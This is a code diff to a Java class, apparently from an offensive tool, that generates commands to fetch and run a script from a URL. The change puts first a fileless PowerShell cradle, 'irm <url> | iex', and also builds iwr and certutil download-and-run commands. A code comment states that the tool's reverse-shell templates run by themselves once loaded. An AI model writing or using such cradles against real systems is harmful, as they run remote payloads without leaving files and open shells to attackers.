@@ -114,13 +114,15 @@ public final class ExecSuggestion {
         }
 
         StringBuilder sb = new StringBuilder();
+        if ("ps1".equals(ext)) {
+            // Shortest path for a PS script: a one-line in-memory cradle, no
+            // file on disk. irm returns the raw body, so it pipes straight into
+            // iex; the reverse-shell templates auto-execute once loaded.
+            sb.append("# PowerShell in-memory (no file on disk)\n");
+            sb.append("irm ").append(url).append(skip).append(" | iex").append("\n\n");
+        }
         sb.append("# PowerShell: download then run\n");
         sb.append(iwr).append("; ").append(runPs).append("\n\n");
-        if ("ps1".equals(ext)) {
-            // A one-line in-memory cradle works for PowerShell scripts.
-            sb.append("# PowerShell in-memory (no file on disk)\n");
-            sb.append("iwr ").append(url).append(skip).append(" | iex").append("\n\n");
-        }
         sb.append("# cmd.exe: download then run\n");
         sb.append(certutil).append(" & ").append(runCmd);
         return sb.toString();
